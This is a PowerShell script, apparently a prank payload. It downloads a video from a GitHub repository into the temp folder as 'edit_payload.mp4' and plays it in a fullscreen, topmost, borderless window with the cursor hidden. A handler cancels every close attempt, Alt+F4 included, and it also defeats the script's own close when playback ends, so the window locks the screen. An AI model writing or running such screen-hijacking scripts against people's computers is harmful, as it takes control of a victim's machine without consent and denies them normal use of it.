Add-Type -AssemblyName PresentationFramework,PresentationCore,WindowsBase

# Новая ссылка на MP4
$u = 'https://github.com/ymkeee/T-Embed/raw/refs/heads/main/edit.mp4'
$f = "$env:TEMP\edit_payload.mp4"

if (-not (Test-Path $f)) {
    Invoke-WebRequest -Uri $u -OutFile $f
}

[xml]$xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        WindowStyle="None" WindowState="Maximized" Topmost="True" 
        Background="Black" Cursor="None" ShowInTaskbar="False">
    <Grid>
        <MediaElement Name="v" Source="$f" LoadedBehavior="Play" Stretch="Uniform" />
    </Grid>
</Window>
"@

$reader = New-Object System.Xml.XmlNodeReader $xaml
$w = [Windows.Markup.XamlReader]::Load($reader)

# Закрыть окно автоматически, когда видео закончится
$v = $w.FindName("v")
$v.add_MediaEnded({ $w.Close() })

# Запрет закрытия через Alt+F4 (по желанию)
$w.Add_Closing({ $_.Cancel = $true })

$w.ShowDialog() | Out-Null
